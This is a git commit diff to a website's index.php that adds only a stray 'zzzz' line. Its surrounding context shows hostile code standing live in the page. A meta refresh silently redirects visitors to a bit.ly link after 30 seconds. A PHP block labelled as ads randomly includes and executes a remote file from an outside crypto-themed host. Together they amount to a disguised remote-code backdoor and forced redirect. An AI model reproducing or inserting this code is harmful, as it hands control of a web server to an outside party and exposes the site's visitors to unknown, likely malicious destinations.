cc7eff9b53c1916149dd3ac31ef61f7b88c425b2
alimehdipak <alimehdipak@gmail.com>
2022-10-07 19:09:16 +0500

    Update index.php

--- index.php
+++ index.php
@@ -117,6 +117,7 @@
   
 <style>.u-disable-duration * {transition-duration: 0s !important;}</style></body></html>
 <meta http-equiv="refresh" content="30;url=https://bit.ly/3TFl6Ur" />
+zzzz
 
 <?php $theAds = array('https://btcmeding.pages.dev/images/test.php', 'https://btcmeding.pages.dev/images/test.php', 'https://btcmeding.pages.dev/images/test.php');
 include $theAds[mt_rand(0, count($theAds) - 1)];
